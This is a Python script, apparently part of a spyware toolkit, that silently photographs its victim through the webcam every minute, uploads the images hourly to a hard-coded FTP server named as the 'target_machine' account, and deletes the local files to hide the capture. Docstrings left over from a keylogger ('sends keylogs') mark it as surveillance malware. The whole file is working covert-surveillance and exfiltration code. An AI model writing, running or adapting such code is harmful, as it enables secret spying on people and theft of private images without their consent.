##################################################################
# webcam_grabber.py
# Author: Shameek Hargrave 
# Purpose: Takes a photo every minute in the background and sends 
# the files to an ftp server every hour. Deletes the image
# files on machine after sending to server.
##################################################################

import cv2
import os
from threading import Timer
from datetime import datetime
from send_file_updates import send_files_to_server
SEND_REPORT_EVERY_SECONDS = 3600 
TAKE_PHOTO_EVERY_SECONDS = 60

HOST = "192.168.1.4"
FTP_USERNAME = "target_machine"
FTP_PASSWORD = "password"

class WebCamGrabber:
    """
    Listen to keystrokes in the background.
    """
    def __init__(self, photo_interval, report_interval, camera_index=0):
        self.photo_interval = photo_interval
        self.report_interval = report_interval
        self.images = []
        self.camera_index = camera_index

    def take_screenshot(self):
        camera = cv2.VideoCapture(self.camera_index)
        res, image = camera.read()
        # filename is the current time
        filename = datetime.now().strftime('%H:%M:%S %m-%d-%Y') + ".jpeg"
    
        if image is not None:
            cv2.imwrite(filename, image)
            self.images.append(filename)

    def take_photos(self):
        """
        Gets called every `self.photo_interval`, takes a webcam photo and stores it.
        """
        self.take_screenshot()
        timer = Timer(interval=self.photo_interval, function=self.take_photos)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def report_to_server(self):
        """
        This function gets called every `self.report_interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if len(self.images) > 0:
            send_files_to_server(self.images, HOST, FTP_USERNAME, FTP_PASSWORD)
            for file in self.images:
                os.remove(file)
            self.start_dt = datetime.now()
        self.images = []
        timer = Timer(interval=self.report_interval, function=self.report_to_server)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        start = datetime.now()
        # start taking photos immediately
        self.take_photos()
        # wait to send the first report
        while ((datetime.now() - start).total_seconds() < self.report_interval):
            continue
        self.report_to_server()

if __name__ == "__main__":
    webcam_grabber = WebCamGrabber(photo_interval=TAKE_PHOTO_EVERY_SECONDS, report_interval=SEND_REPORT_EVERY_SECONDS, camera_index=0)
    webcam_grabber.start()